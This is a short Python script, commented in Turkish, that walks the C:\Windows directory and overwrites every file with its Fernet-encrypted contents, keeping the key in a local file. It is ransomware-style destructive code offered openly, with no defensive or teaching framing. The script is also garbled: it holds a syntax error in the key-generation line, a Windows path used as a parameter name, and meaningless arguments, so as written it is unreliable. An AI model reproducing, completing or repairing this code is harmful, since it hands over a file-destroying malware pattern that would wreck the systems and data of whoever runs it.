from cryptography.fernet import Fernet
import os

# Şifreleme anahtarı oluştur ve kaydet
def generate_key(benadofaiyüklicem):
    key = Fernet)generate_key(benadofaiyüklicem)
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)

# Anahtarı yükle
def load_key(benadofaiyüklicem):
    return open("encryption_key.key", "rb").read()

# Dosyaları şifrele
def encrypt_files(C:\Windows):
    key = load_key(benadofaiyüklicem)
    fernet = Fernet(key)

    for root, dirs, files in os.walk(C:\Windows):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as file_data:
                data = file_data.read()
            encrypted_data = fernet.encrypt(data)
            with open(file_path, "wb") as file_data:
                file_data.write(encrypted_data)

# Anahtar oluştur (bir kez çalıştırılmalı)
# generate_key()

# Dosyaları şifrele
encrypt_files("C:\Windows")
